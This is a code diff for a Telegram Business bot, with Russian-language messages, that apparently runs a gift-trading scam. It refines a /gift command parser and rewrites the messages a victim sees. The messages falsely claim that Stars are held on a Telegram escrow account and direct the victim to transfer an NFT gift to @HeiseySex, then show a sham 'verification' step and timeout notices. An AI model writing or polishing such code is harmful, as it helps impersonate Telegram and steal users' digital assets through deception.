@@ -42,11 +42,14 @@ def normalize_url(raw):
 
 
 def parse_gift_command(text):
-    """Разбор /gift для Business-чата."""
-    body = text.replace("/gift", "", 1).strip()
+    """Разбор /gift для Business-чата (улучшенный)."""
+    # Убираем команду и возможные упоминания бота
+    body = re.sub(r'^/gift(@\w+)?\s*', '', text, flags=re.IGNORECASE).strip()
+    
     if not body:
         return None
 
+    # Сначала ищем кавычки
     quoted = re.findall(r'"([^"]*)"', body)
     without_quotes = re.sub(r'"[^"]*"', "", body).strip()
 
@@ -63,9 +66,9 @@ def parse_gift_command(text):
         parts = body.split()
         if len(parts) < 3:
             return None
-        name = parts[0]
-        url = normalize_url(parts[1])
-        amount_part = parts[2]
+        name = " ".join(parts[:-2]) # Название может состоять из нескольких слов
+        url = normalize_url(parts[-2])
+        amount_part = parts[-1]
 
     amount = re.sub(r"\D", "", amount_part) if amount_part else ""
 
@@ -86,64 +89,82 @@ def parse_inline_query(raw):
     return name, url, amount
 
 
-# ─────────────────────── ТЕКСТЫ ───────────────────────
+# ─────────────────────── ТЕКСТЫ (СТАРЫЙ ДИЗАЙН) ───────────────────────
 
 def build_offer_message(name, url, amount):
     return (
-        "🎁 <b>Новое предложение</b>\n\n"
-        f"Вам предлагают <b>{amount} ⭐</b> за подарок "
+        "Вам поступило предложение о покупке подарка.\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"Пользователь предлагает вам <b>{amount}</b> ⭐ за подарок "
         f"<a href=\"{url}\">{name}</a>.\n\n"
-        "<i>Принять сделку или отклонить?</i>"
+        "━━━━━━━━━━━━━━━━━━━━"
     )
 
 
 def build_offer_keyboard():
-    kb = InlineKeyboardMarkup()
-    kb.row(
+    keyboard = InlineKeyboardMarkup()
+    keyboard.row(
         InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
-        InlineKeyboardButton("✖️ Отклонить", callback_data="stage_decline"),
+        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
     )
-    return kb
+    return keyboard
 
 
 def build_escrow_message(name, url, amount):
     return (
-        f"🔒 <b>Средства зарезервированы</b>\n\n"
-        f"<b>{amount} ⭐</b> уже на эксроу-счёте Telegram и "
-        f"зачислятся вам сразу после передачи подарка.\n\n"
-        "<b>Как завершить сделку:</b>\n"
-        f"1. Передайте <a href=\"{url}\">{name}</a> пользователю @HeiseySex\n"
-        "2. Нажмите «Передать NFT»\n"
-        "3. Подтвердите передачу\n\n"
-        "<i>Как только подарок уйдёт — звёзды придут автоматически.</i>"
+        f"Пользователь зарезервировал <b>{amount}</b> ⭐ через "
+        "эксроу-систему Telegram. Средства хранятся на специальном "
+        "эксроу-счёте и будут автоматически зачислены на ваш баланс "
+        "звёзд сразу после передачи подарка.\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n"
+        "<b>Инструкция для завершения сделки:</b>\n\n"
+        f"1. Передайте подарок пользователю: @HeiseySex\n"
+        f"2. Нажмите «Передать NFT» и выберите "
+        f"<a href=\"{url}\">{name}</a>\n"
+        "3. Подтвердите передачу подарка.\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"Telegram зафиксирует транзакцию и моментально зачислит "
+        f"<b>{amount}</b> ⭐ на ваш баланс."
     )
 
 
 def build_escrow_keyboard():
-    kb = InlineKeyboardMarkup()
-    kb.row(InlineKeyboardButton("🎁 Передать подарок", url=TARGET_URL))
-    kb.row(
-        InlineKeyboardButton("✅ Я передал", callback_data="stage_verify"),
-        InlineKeyboardButton("✖️ Отменить", callback_data="stage_decline"),
+    keyboard = InlineKeyboardMarkup()
+    keyboard.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
+    keyboard.row(
+        InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
+        InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
     )
-    return kb
+    return keyboard
 
 
 MSG_VERIFY = (
-    "⏳ <b>Проверяем передачу…</b>\n\n"
-    "Это займёт до пары минут. Не закрывайте чат."
+    "⏳ <b>Проверка передачи…</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━\n\n"
+    "Система проверяет статус передачи подарка. "
+    "Это может занять несколько минут.\n\n"
+    "Пожалуйста, не закрывайте чат.\n\n"
+    "━━━━━━━━━━━━━━━━━━━━"
 )
 
 MSG_TIMEOUT = (
-    "⌛ <b>Сделка не завершена</b>\n\n"
-    "Передача подарка не подтвердилась вовремя — резерв средств снят, "
-    "предложение аннулировано.\n\n"
-    "<i>Хотите попробовать снова? Попросите отправить предложение повторно.</i>"
+    "⛔ <b>Сделка не завершена.</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━\n\n"
+    "Вы не выполнили все условия передачи подарка.\n\n"
+    "Передача не была подтверждена в установленное время, "
+    "поэтому резерв средств был снят, а предложение — "
+    "автоматически аннулировано.\n\n"
+    "Если вы всё ещё хотите завершить сделку, попросите "
+    "пользователя отправить предложение повторно.\n\n"
+    "━━━━━━━━━━━━━━━━━━━━"
 )
 
 MSG_DECLINE = (
-    "✖️ <b>Предложение отклонено</b>\n\n"
-    "<i>Если передумаете — предложение можно отправить снова.</i>"
+    "❌ <b>Предложение отклонено.</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━\n\n"
+    "Сессия закрыта. Если вы передумаете, "
+    "пользователь может отправить предложение повторно.\n\n"
+    "━━━━━━━━━━━━━━━━━━━━"
 )
 
 
@@ -264,9 +285,8 @@ def handle_business_message(message):
     if not parsed:
         send_business_message(
             message.chat.id,
-            "❌ Неверный формат.\n\n"
-            "Используй: /gift \"Название\" \"ссылка\" 100\n"
-            "Или через inline: @бот Название | ссылка | 100",
+            "❌ Неверный формат команды.\n\n"
+            "Используй: /gift \"Название\" \"ссылка\" 100",
             conn_id,
         )
         return
@@ -455,7 +475,7 @@ def health():
     return "OK"
 
 def run_bot():
-    print("✨ Бот запущен.")
+    print("✨ Business-бот запущен (в облаке).")
     print(f"OWNER_ID: {OWNER_ID}")
     bot.infinity_polling(
         allowed_updates=[
